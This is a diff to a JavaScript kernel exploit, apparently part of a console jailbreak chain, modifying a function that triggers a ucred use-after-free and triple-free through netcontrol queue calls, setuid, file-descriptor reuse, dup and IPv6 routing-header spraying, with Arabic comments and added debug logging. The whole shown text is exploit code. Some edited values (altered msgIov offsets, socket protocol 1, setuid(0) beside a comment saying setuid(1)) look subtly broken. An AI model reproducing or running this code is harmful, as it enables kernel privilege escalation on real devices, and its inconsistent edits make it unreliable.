@@ -1392,81 +1392,90 @@ function remove_uaf_file() {
     }
   }
 }
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 1000;
 function trigger_ucred_triplefree() {
   //log("[TRIGGER] enter trigger_ucred_triplefree");
   var end = false;
 
   // msgIov كما في الأصلي
   log("[TRIGGER] init msgIov");
-  write64(msgIov.add(0x0), 1);
-  write64(msgIov.add(0x8), 1);
+  write64(msgIov.add(0x4), 1);
+  write64(msgIov.add(0x16), 1);
   var main_count = 0;
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
     //log("[TRIGGER] loop start main_count=" + main_count);
 
     // 1) dummy socket → register in netcontrol
-    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 1);
+    send_notification("step 1: dummy_socket = " + dummy_socket);
+
+    // نحتفظ بالـ FD الأصلي قبل أي لعب
     var dummy_fd = dummy_socket;
 
     var sock_buf = malloc(8);
     write32(sock_buf, dummy_socket);
-    netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, sock_buf, 8);
-    close(dummy_socket);
+    send_notification("step 1: sock_buf[0..3] = " + read32(sock_buf));
 
-    send_notification("dummy_fd = " + dummy_fd);
+    netcontrol(-1, 0x20000003, sock_buf, 8);
+
+    // نقفل الـ dummy → نرشّح الـ file + ucred لـ UAF
+    close(dummy_socket);
 
     // 2) allocate new ucred
     setuid(1);
 
     // 3) reclaim fd → uaf_socket
-    uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("uaf_socket = " + uaf_socket);
+    send_notification("step 3: start (reclaim fd → uaf_socket)");
+    uaf_socket = socket(AF_UNIX, SOCK_STREAM, 1);
+    send_notification("step 3: uaf_socket = " + uaf_socket + " (expected FD reuse ~ " + dummy_fd + ")");
 
     // 4) free previous ucred
-    setuid(1);
+    setuid(0);
+    send_notification("step 4: (setuid(1) free previous ucred) done");
 
-    // 5) unregister → CLEAR_QUEUE باستخدام dummy_fd
+    // هنا التغيير المهم: نستخدم dummy_fd مش uaf_socket
     var ctrl_buf = malloc(8);
     write32(ctrl_buf, dummy_fd);
-    netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, ctrl_buf, 8);
+    send_notification("step 5: ctrl_buf[0..3] (dummy_fd) = " + read32(ctrl_buf));
 
-    // 6) refcount dance
+    netcontrol(-1, 0x20000007, ctrl_buf, 8);
+    send_notification("step 5: (after netcontrol CLEAR_QUEUE with dummy_fd) done");
+
+    // 6) محاولة إصلاح refcount بشكل خفيف (نخليها زي ما هي مؤقتًا)
+    send_notification("iov0=" + iov_sock_0 + ", iov1=" + iov_sock_1);
     for (var i = 0; i < 2; i++) {
-      trigger_iov_recvmsg();
-      var w = write(new BigInt(iov_sock_1), tmp, 1);
-      wait_iov_recvmsg();
-      var r = read(new BigInt(iov_sock_0), tmp, 1);
-    }
+        trigger_iov_recvmsg();
+        var w = write(new BigInt(iov_sock_1), tmp, 1);
+        wait_iov_recvmsg();
+        var r = read(new BigInt(iov_sock_0), tmp, 1);
 
-    // 7) first double-free via dup(uaf_socket)
+        send_notification("step 6: loop " + i + " (w=" + w + ", r=" + r + ")");
+    }
+    // 7) double free أول مرة – نحاول نخليها أوضح شوية في اللوج
     var dup_fd = dup(uaf_socket);
+    send_notification("step 7: dup_fd = " + dup_fd + " (from uaf_socket = " + uaf_socket + ")");
+
     if (dup_fd > -1) {
       close(dup_fd);
-    }
-    send_notification("dup_fd = " + dup_fd);
-
-    // 8) FD-REUSE check + find_twins مرة واحدة بس
-    var twins_found = false;
-
-    if (dummy_fd.eq(uaf_socket) && !dup_fd.eq(dummy_fd)) {
-      send_notification("FD-REUSE HIT: dummy == uaf == " + dummy_fd + " dup=" + dup_fd);
-      twins_found = find_twins();
-      send_notification("find_twins() => " + twins_found);
     } else {
-      twins_found = find_twins();
+      send_notification("step 7: dup failed");
     }
+    // 8) إيجاد التوأم
+    send_notification("[TRIGGER] step 8: find_twins()");
+    end = find_twins();
+    send_notification("[TRIGGER] step 8: find_twins() result end=" + end);
 
-    if (!twins_found) {
-      close(new BigInt(uaf_socket));
+    if (!end) {
+      send_notification("[TRIGGER] step 8: no twins, cleanup & retry");
       twins[0] = -1;
       twins[1] = -1;
+      close(new BigInt(uaf_socket));
       continue;
     }
 
-    send_notification("twins found: " + twins[0] + ", " + twins[1]);
+    send_notification("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
 
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
